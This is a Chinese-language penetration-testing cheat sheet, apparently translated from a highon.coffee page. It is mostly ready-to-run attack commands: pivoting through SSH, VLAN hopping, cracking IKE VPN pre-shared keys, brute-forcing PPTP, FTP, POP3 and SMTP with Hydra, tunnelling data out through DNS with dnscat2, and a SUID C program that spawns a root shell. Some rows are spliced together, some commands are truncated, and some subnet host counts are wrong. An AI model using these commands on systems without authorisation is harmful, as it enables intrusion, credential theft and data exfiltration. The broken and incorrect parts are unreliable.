利用SSH跳板跨越网络
    ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
需在`/etc/proxychains.conf` 添加sock4 `127.0.0.1 1010`
    proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
在`/etc/proxychains.conf` 添加sock4 `127.0.0.1 1011`
#### Meterpreter Pivoting
### TTL 指纹识别
操作系统 | TTL 值  
---|---  
Windows | `128`  
Linux | `64`  
Solaris | `255`  
Cisco / Network | `255`  
### IPv4 速查
#### 各类IP的地址范围
类别 | IP 地址范围  
---|---  
A类 | `0.0.0.0 - 127.255.255.255`  
B类 | `128.0.0.0 - 191.255.255.255`  
C类 | `192.0.0.0 - 223.255.255.255`  
D类 | `224.0.0.0 - 239.255.255.255`  
E类 | `240.0.0.0 - 255.255.255.255`  
#### IPv4私有地址
类别 | 范围  
---|---  
A类私有地址 | `10.0.0.0 - 10.255.255.255`  
B类私有地址 | `172.16.0.0 - 172.31.255.255`  
C类私有地址 | `192.168.0.0 - 192.168.255.255`  
| `127.0.0.0 - 127.255.255.255`  
#### IPv4子网速查表
和渗透测试关系不太大，但确实很有用。
CIDR | 十进制掩码 | 主机数量  
---|---|---  
/31 | `255.255.255.254` | `1 Host`  
/30 | `255.255.255.252` | `2 Hosts`  
/29 | `255.255.255.248` | `6 Hosts`  
/28 | `255.255.255.240` | `14 Hosts`  
/27 | `255.255.255.224` | `30 Hosts`  
/26 | `255.255.255.192` | `62 Hosts`  
/25 | `255.255.255.128` | `126 Hosts`  
/24 | `255.255.255.0` | `254 Hosts`  
/23 | `255.255.254.0` | `512 Host`  
/22 | `255.255.252.0` | `1022 Hosts`  
/21 | `255.255.248.0` | `2046 Hosts`  
/20 | `255.255.240.0` | `4094 Hosts`  
/19 | `255.255.224.0` | `8190 Hosts`  
/18 | `255.255.192.0` | `16382 Hosts`  
/17 | `255.255.128.0` | `32766 Hosts`  
/16 | `255.255.0.0` | `65534 Hosts`  
/15 | `255.254.0.0` | `131070 Hosts`  
/14 | `255.252.0.0` | `262142 Hosts`  
/13 | `255.248.0.0` | `524286 Hosts`  
/12 | `255.240.0.0` | `1048674 Hosts`  
/11 | `255.224.0.0` | `2097150 Hosts`  
/10 | `255.192.0.0` | `4194302 Hosts`  
/9 | `255.128.0.0` | `8388606 Hosts`  
/8 | `255.0.0.0` | `16777214 Hosts`  
### VLAN hopping（跳跃攻击）
使用nccgroup 的脚本简化攻击过程
    git clone https://github.com/nccgroup/vlan-hopping.git
    chmod 700 frogger.sh
    ./frogger.sh
### VPN测试工具
识别VPN服务器
    ./udp-protocol-scanner.pl -p ike TARGET(s)
扫描VPN服务器网段：
    ./udp-protocol-scanner.pl -p ike -f ip.txt
#### IKEForce
使用IKEForce枚举或对 VPN 服务器进行字典攻击.
安装:
    pip install pyip
    git clone https://github.com/SpiderLabs/ikeforce.git
使用IKEForce对IKE VPN 进行枚举：
    ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
使用 IKEForce 爆破 IKE VPN:
    ./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
    ike-scan
    ike-scan TARGET-IP
    ike-scan -A TARGET-IP
    ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
#### IKE 激进模式 PSK 破解
  1. 验证VPN服务器
  2. 使用 IKEForce 枚举来获得组ID
  3. 使用 ike-scan 从IKE 终端抓取 PSK 哈希 
  4. 使用 psk-crack 破解哈希
##### Step 1: 验证IKE服务器
    ./udp-protocol-scanner.pl -p ike SUBNET/24
##### Step 2:使用IKEForce枚举组名
    ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
##### Step 3: 使用ike-scan抓取PSK哈希
    ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
##### Step 4: 使用psk-crack 破解PSK 哈希
    psk-crack hash-file.txt
高级psk-crack 选项:
    pskcrack
    psk-crack -b 5 TARGET-IPkey
    psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
    psk-crack -d /path/to/dictionary-file TARGET-IP-key
#### PPTP Hacking
验证PPTP服务 ，它以TCP协议在1723端口监听
##### NMAP PPTP 指纹识别:
    nmap –Pn -sV -p 1723 TARGET(S)
##### PPTP字典攻击
    thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
### DNS 隧道
通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。
#### 攻击机器：
安装:
    apt-get update
    apt-get -y install ruby-dev git make g++
    gem install bundler
    git clone https://github.com/iagox86/dnscat2.git
    cd dnscat2/server
    bundle install
运行dnscat2:
    ruby ./dnscat2.rb
    dnscat2> New session established: 1422
    dnscat2> session -i 1422
目标机器:
    dnscat --host 
## BOF / Exploit
## Exploit 搜索
寻找枚举主机/服务的exp
命令 | 解释  
---|---  
searchsploit windows 2003 | grep -i local | 从 exploit-db搜索EXP,
这里以WIndows2003本地提权为例  
`site:exploit-db.com exploit kernel  80, :DocumentRoot =>
Dir.pwd).start"` | 运行一个基本的ruby http 服务  
`php -S 0.0.0.0:80` | 运行一个基本的 PHP http 服务  
## 挂载文件共享
怎样挂载 NFS / CIFS以进行 Windows 和Linux 的文件共享。
命令 | 解释  
---|---  
`mount 192.168.1.1:/vol/share /mnt/nfs` | 挂载NFS共享到 `/mnt/nfs`  
`mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs` | 挂载Windows CIFS / SMB 共享到 Linux 的 `/mnt/cifs`
。如果不直接在命令里带密码，可以在询问后输入，这样就不会在bash命令历史里存储明文密码  
`net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no`
| 使用命令行在Windows间挂载共享文件  
`apt-get install smb4k -y` | 在Kali上安装smb4k，方便从Linux的GUI查看SMB共享  
## HTTP / HTTPS Web服务枚举
命令 | 解释  
---|---  
`nikto -h 192.168.1.1` | 对目标使用 nikto 进行扫描  
`dirbuster` | 使用GUI配置，命令行不好使  
## 数据包侦测
命令 | 解释  
---|---  
`tcpdump tcp port 80 -w output.pcap -i eth0` | 将网卡eth0的80端口的流量导出到output.pcap  
## 用户名枚举
一些用来枚举目标系统用户名的手法。
### SMB 用户枚举
命令 | 解释  
---|---  
`python /usr/share/doc/python-impacket-doc/examples/samrdump.py
192.168.XXX.XXX` | 枚举SMB用户  
`ridenum.py 192.168.XXX.XXX 500 50000 dict.txt` | 利用RID cycle枚举SMB用户  
### SNMP 用户枚举
COMMAND | DESCRIPTION  
---|---  
snmpwalk public -v1 192.168.X.XXX 1 | grep 77.1.2.25 | cut -d” “ -f4 | 枚举 SNMP
用户  
`python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP
192.168.X.XXX` | 枚举 SNMP 用户  
`nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)` |
使用nmap搜索SNMP服务器，然后用grep过滤输出  
## 密码
### 字典
命令 | 解释  
---|---  
`/usr/share/wordlists` | Kali 的字典存放路径  
## 爆破服务
### 使用Hydra 爆破FTP
命令 | 解释  
---|---  
`hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V` |
使用Hydra 爆破FTP  
### 使用Hydra 爆破POP3
COMMAND | DESCRIPTION  
---|---  
`hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V` |
使用Hydra 爆破POP3  
### 使用Hydra 爆破SMTP
COMMAND | DESCRIPTION  
---|---  
`hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V` | 使用Hydra 爆破SMTP  
使用 `-t` 限制并发连接数，如 `-t 15`
## 密码破解
渗透测试中用于密码破解的工具。
### John The Ripper - JTR
命令 | 解释  
---|---  
`john --wordlist=/usr/share/wordlists/rockyou.txt hashes` | JTR 破解密码  
`john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt`
| JTR 使用字典爆破解密  
`john --format=descrypt hash --show` | JTR 爆破解密  
## Windows 渗透测试命令
See **Windows Penetration Testing Commands**.【待原文补充】
## Linux 渗透测试命令
参考本站的[Linux 命令速查表](https://highon.coffee/blog/linux-commands-cheat-sheet/)
，该表提供了很多有用的命令。
## 编译EXP
Some notes on compiling exploits.【待原文补充】
### 判断C代码适用于Windows平台还是Linux
通过`#include` 的文件来判定
命令 | 解释  
---|---  
`process.h, string.h, winbase.h, windows.h, winsock2.h` | Windows平台代码  
`arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h,
unistd.h` | Linux平台代码  
### 使用GCC编译Exploit
命令 | 解释  
---|---  
`gcc -o exploit exploit.c` | GCC基本用法  
### 在64位的Kali上用GCC编译32位的EXP
很方便地在64位的攻击机器上交叉编译32位的二进制文件。
命令 | 解释  
---|---  
`gcc -m32 exploit.c -o exploit` | 在64位的Linux上交叉编译32位的二进制文件  
### 在 Linux上编译可运行于Windows的exe文件
COMMAND | DESCRIPTION  
---|---  
`i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe` | 在
Linux上生成Windows的exe  
## SUID 二进制
通常具有SUID的 C二进制文件要求以超级用户登陆shell，您可以按需更新UID / GID和shell。
下面是一些可用的shell：
### 运行 /bin/bash的SUID C Shell
    int main(void){
           setresuid(0, 0, 0);
           system("/bin/bash");
    }
### 运行 /bin/sh的SUID C Shell